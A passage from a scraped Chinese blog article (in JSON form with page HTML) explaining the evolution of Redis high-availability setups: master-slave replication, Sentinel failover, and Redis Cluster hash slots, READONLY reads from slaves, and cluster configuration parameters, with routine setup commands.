{"title": "Redis 架构演变与 Redis-cluster 群集读写方案", "url": "http://blog.jobbole.com/114270/", "create_date": "2018/08/14", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "url_object_id": "7dac2cf4ba2ba6db98a928d39b6db6b4", "praise_nums": 2, "fav_nums": 2, "comment_nums": 0, "tags": "IT技术,Redis,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/u/2600078/blog/1923696\">PingLee</a>   </div><h2>导言</h2>\n<p>Redis-cluster 是近年来 Redis 架构不断改进中的相对较好的 Redis 高可用方案。本文涉及到近年来 Redis 多实例架构的演变过程，包括普通主从架构（Master、slave 可进行写读分离）、哨兵模式下的主从架构、Redis-cluster 高可用架构（Redis 官方默认 cluster 下不进行读写分离）的简介。同时还介绍使用Java的两大redis客户端：Jedis与Lettuce用于读写redis-cluster的数据的一般方法。再通过官方文档以及互联网的相关技术文档，给出redis-cluster架构下的读写能力的优化方案，包括官方的推荐的扩展redis-cluster下的Master数量以及非官方默认的redis-cluster的读写分离方案，案例中使用Lettuce的特定方法进行redis-cluster架构下的数据读写分离。</p>\n<p> </p>\n<h2>近年来redis多实例用架构的演变过程</h2>\n<p>redis是基于内存的高性能key-value数据库，若要让redis的数据更稳定安全，需要引入多实例以及相关的高可用架构。而近年来redis的高可用架构亦不断改进，先后出现了本地持久化、主从备份、哨兵模式、redis-cluster群集高可用架构等等方案。</p>\n<p> </p>\n<h3>1、redis普通主从模式</h3>\n<p>通过持久化功能，Redis保证了即使在服务器重启的情况下也不会损失（或少量损失）数据，因为持久化会把内存中数据保存到硬盘上，重启会从硬盘上加载数据。 。但是由于数据是存储在一台服务器上的，如果这台服务器出现硬盘故障等问题，也会导致数据丢失。为了避免单点故障，通常的做法是将数据库复制多个副本以部署在不同的服务器上，这样即使有一台服务器出现故障，其他服务器依然可以继续提供服务。为此， Redis 提供了复制（replication）功能，可以实现当一台数据库中的数据更新后，自动将更新的数据同步到其他数据库上。</p>\n<p>在复制的概念中，数据库分为两类，一类是主数据库（master），另一类是从数据库（slave）。主数据库可以进行读写操作，当写操作导致数据变化时会自动将数据同步给从数据库。而从数据库一般是只读的，并接受主数据库同步过来的数据。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/207ba1f265e3f8284aaaba6bcf90b430.png\" alt=\"\"></p>\n<p>主从模式的配置，一般只需要再作为slave的redis节点的conf文件上加入“slaveof master<em>ip master</em>port”， 或者作为slave的redis节点启动时使用如下参考命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710542e3073387748\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nredis-server --port 6380 --slaveof masterIp masterPort   </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710542e3073387748-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710542e3073387748-1\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6380</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">slaveof </span><span class=\"crayon-e\">masterIp </span><span class=\"crayon-i\">masterPort</span><span class=\"crayon-h\">   </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>redis的普通主从模式，能较好地避免单独故障问题，以及提出了读写分离，降低了Master节点的压力。互联网上大多数的对redis读写分离的教程，都是基于这一模式或架构下进行的。但实际上这一架构并非是目前最好的redis高可用架构。</p>\n<p> </p>\n<h3>2、redis哨兵模式高可用架构</h3>\n<p>当主数据库遇到异常中断服务后，开发者可以通过手动的方式选择一个从数据库来升格为主数据库，以使得系统能够继续提供服务。然而整个过程相对麻烦且需要人工介入，难以实现自动化。 为此，Redis 2.8开始提供了哨兵工具来实现自动化的系统监控和故障恢复功能。 哨兵的作用就是监控redis主、从数据库是否正常运行，主出现故障自动将从数据库转换为主数据库。</p>\n<p>顾名思义，哨兵的作用就是监控Redis系统的运行状况。它的功能包括以下两个。</p>\n<p>（1）监控主数据库和从数据库是否正常运行。<br>\n（2）主数据库出现故障时自动将从数据库转换为主数据库。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/17ab8892f84f16670be20a9f8c68a290.png\" alt=\"\"></p>\n<p>可以用info replication查看主从情况 例子： 1主2从 1哨兵,可以用命令起也可以用配置文件里 可以使用双哨兵，更安全，参考命令如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710542ee982588691\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nredis-server --port 6379 \r\nredis-server --port 6380 --slaveof 192.168.0.167 6379 \r\nredis-server --port 6381 --slaveof 192.168.0.167 6379\r\nredis-sentinel sentinel.conf </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710542ee982588691-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710542ee982588691-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710542ee982588691-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710542ee982588691-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710542ee982588691-1\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710542ee982588691-2\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6380</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">slaveof</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.0.167</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5bab6710542ee982588691-3\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6381</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">slaveof</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.0.167</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710542ee982588691-4\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">sentinel </span><span class=\"crayon-v\">sentinel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">conf</span><span class=\"crayon-h\"> </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>其中，哨兵配置文件sentinel.conf参考如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710542f2393876310\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsentinel monitor mymaster 192.168.0.167 6379 1  </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710542f2393876310-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710542f2393876310-1\"><span class=\"crayon-e\">sentinel </span><span class=\"crayon-e\">monitor </span><span class=\"crayon-i\">mymaster</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.0.167</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">  </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>其中mymaster表示要监控的主数据库的名字。配置哨兵监控一个系统时，只需要配置其监控主数据库即可，哨兵会自动发现所有复制该主数据库的从数据库。<br>\nMaster与slave的切换过程：<br>\n（1）slave leader升级为master<br>\n（2）其他slave修改为新master的slave<br>\n（3）客户端修改连接<br>\n（4）老的master如果重启成功，变为新master的slave</p>\n<p> </p>\n<h3>3、redis-cluster群集高可用架构</h3>\n<p>即使使用哨兵，redis每个实例也是全量存储，每个redis存储的内容都是完整的数据，浪费内存且有木桶效应。为了最大化利用内存，可以采用cluster群集，就是分布式存储。即每台redis存储不同的内容。<br>\n采用redis-cluster架构正是满足这种分布式存储要求的集群的一种体现。redis-cluster架构中，被设计成共有16384个hash slot。每个master分得一部分slot，其算法为：hash_slot = crc16(key) mod 16384 ，这就找到对应slot。采用hash slot的算法，实际上是解决了redis-cluster架构下，有多个master节点的时候，数据如何分布到这些节点上去。key是可用key，如果有{}则取{}内的作为可用key，否则整个可以是可用key。群集至少需要3主3从，且每个实例使用不同的配置文件。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/ed8920476ba7cd6bde258a6eb8fc03de.png\" alt=\"\"></p>\n<p>在redis-cluster架构中，redis-master节点一般用于接收读写，而redis-slave节点则一般只用于备份，其与对应的master拥有相同的slot集合，若某个redis-master意外失效，则再将其对应的slave进行升级为临时redis-master。<br>\n<strong>在redis的官方文档中，对redis-cluster架构上，有这样的说明：在cluster架构下，默认的，一般redis-master用于接收读写，而redis-slave则用于备份，当有请求是在向slave发起时，会直接重定向到对应key所在的master来处理。但如果不介意读取的是redis-cluster中有可能过期的数据并且对写请求不感兴趣时，则亦可通过readonly命令，将slave设置成可读，然后通过slave获取相关的key，达到读写分离</strong>。具体可以参阅redis官方文档（https://redis.io/commands/readonly）等相关内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710542f8191282663\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEnables read queries for a connection to a Redis Cluster slave node.    \r\nNormally slave nodes will redirect clients to the authoritative master for the hash slot involved in a given command, however clients can use slaves in order to scale reads using the READONLY command.    \r\nREADONLY tells a Redis Cluster slave node that the client is willing to read possibly stale data and is not interested in running write queries.    \r\nWhen the connection is in readonly mode, the cluster will send a redirection to the client only if the operation involves keys not served by the slave's master node. This may happen because:  \r\nThe client sent a command about hash slots never served by the master of this slave.\r\nThe cluster was reconfigured (for example resharded) and the slave is no longer able to serve commands for a given hash slot.</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710542f8191282663-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710542f8191282663-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710542f8191282663-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710542f8191282663-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710542f8191282663-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710542f8191282663-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710542f8191282663-1\"><span class=\"crayon-e\">Enables </span><span class=\"crayon-e\">read </span><span class=\"crayon-e\">queries </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">connection </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Redis </span><span class=\"crayon-e\">Cluster </span><span class=\"crayon-e\">slave </span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710542f8191282663-2\"><span class=\"crayon-e\">Normally </span><span class=\"crayon-e\">slave </span><span class=\"crayon-e\">nodes </span><span class=\"crayon-e\">will </span><span class=\"crayon-e\">redirect </span><span class=\"crayon-e\">clients </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">authoritative </span><span class=\"crayon-e\">master </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">hash </span><span class=\"crayon-e\">slot </span><span class=\"crayon-e\">involved </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">given </span><span class=\"crayon-v\">command</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">however </span><span class=\"crayon-e\">clients </span><span class=\"crayon-e\">can </span><span class=\"crayon-st\">use</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">slaves </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">order </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">scale </span><span class=\"crayon-e\">reads </span><span class=\"crayon-e\">using </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">READONLY </span><span class=\"crayon-v\">command</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">    </span></div><div class=\"crayon-line\" id=\"crayon-5bab6710542f8191282663-3\"><span class=\"crayon-e\">READONLY </span><span class=\"crayon-i\">tells</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Redis </span><span class=\"crayon-e\">Cluster </span><span class=\"crayon-e\">slave </span><span class=\"crayon-e\">node </span><span class=\"crayon-e\">that </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">client </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">willing </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">read </span><span class=\"crayon-e\">possibly </span><span class=\"crayon-e\">stale </span><span class=\"crayon-e\">data </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">interested </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">write </span><span class=\"crayon-v\">queries</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710542f8191282663-4\"><span class=\"crayon-e\">When </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">connection </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">readonly </span><span class=\"crayon-v\">mode</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">cluster </span><span class=\"crayon-e\">will </span><span class=\"crayon-i\">send</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">redirection </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">client </span><span class=\"crayon-e\">only </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">operation </span><span class=\"crayon-e\">involves </span><span class=\"crayon-e\">keys </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">served </span><span class=\"crayon-e\">by </span><span class=\"crayon-e\">the </span><span class=\"crayon-i\">slave</span>'<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">master </span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">This</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">may </span><span class=\"crayon-e\">happen </span><span class=\"crayon-v\">because</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5bab6710542f8191282663-5\"><span class=\"crayon-e\">The </span><span class=\"crayon-e\">client </span><span class=\"crayon-i\">sent</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">command </span><span class=\"crayon-e\">about </span><span class=\"crayon-e\">hash </span><span class=\"crayon-e\">slots </span><span class=\"crayon-e\">never </span><span class=\"crayon-e\">served </span><span class=\"crayon-e\">by </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">master </span><span class=\"crayon-e\">of </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">slave</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710542f8191282663-6\"><span class=\"crayon-e\">The </span><span class=\"crayon-e\">cluster </span><span class=\"crayon-e\">was </span><span class=\"crayon-e\">reconfigured</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">example </span><span class=\"crayon-v\">resharded</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">slave </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">no </span><span class=\"crayon-e\">longer </span><span class=\"crayon-e\">able </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">serve </span><span class=\"crayon-e\">commands </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">given </span><span class=\"crayon-e\">hash </span><span class=\"crayon-v\">slot</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0115 seconds] -->\r\n<p>例如，我们假设已经建立了一个三主三从的redis-cluster架构，其中A、B、C节点都是redis-master节点，A1、B1、C1节点都是对应的redis-slave节点。在我们只有master节点A，B，C的情况下，对应redis-cluster如果节点B失败，则群集无法继续，因为我们没有办法再在节点B的所具有的约三分之一的hash slot集合范围内提供相对应的slot。然而，如果我们为每个主服务器节点添加一个从服务器节点，以便最终集群由作为主服务器节点的A，B，C以及作为从服务器节点的A1，B1，C1组成，那么如果节点B发生故障，系统能够继续运行。节点B1复制B，并且B失效时，则redis-cluster将促使B的从节点B1作为新的主服务器节点并且将继续正确地操作。但请注意，如果节点B和B1在同一时间发生故障，则Redis群集无法继续运行。</p>\n<p>Redis群集配置参数:在继续之前，让我们介绍一下Redis Cluster在redis.conf文件中引入的配置参数。有些命令的意思是显而易见的，有些命令在你阅读下面的解释后才会更加清晰。</p>\n<p>（1）cluster-enabled ：如果想在特定的Redis实例中启用Redis群集支持就设置为yes。 否则，实例通常作为独立实例启动。<br>\n（2）cluster-config-file ：请注意，尽管有此选项的名称，但这不是用户可编辑的配置文件，而是Redis群集节点每次发生更改时自动保留群集配置（基本上为状态）的文件。<br>\n（3）cluster-node-timeout ：Redis群集节点可以不可用的最长时间，而不会将其视为失败。 如果主节点超过指定的时间不可达，它将由其从属设备进行故障切换。<br>\n（4）cluster-slave-validity-factor ：如果设置为0，无论主设备和从设备之间的链路保持断开连接的时间长短，从设备都将尝试故障切换主设备。 如果该值为正值，则计算最大断开时间作为节点超时值乘以此选项提供的系数，如果该节点是从节点，则在主链路断开连接的时间超过指定的超时值时，它不会尝试启动故障切换。<br>\n（5）cluster-migration-barrier ：主设备将保持连接的最小从设备数量，以便另一个从设备迁移到不受任何从设备覆盖的主设备。有关更多信息，请参阅本教程中有关副本迁移的相应部分。<br>\n（6）cluster-require-full-coverage ：如果将其设置为yes，则默认情况下，如果key的空间的某个百分比未被任何节点覆盖，则集群停止接受写入。 如果该选项设置为no，则即使只处理关于keys子集的请求，群集仍将提供查询。</p>\n<p>以下是最小的Redis集群配置文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710542fe125424073\" 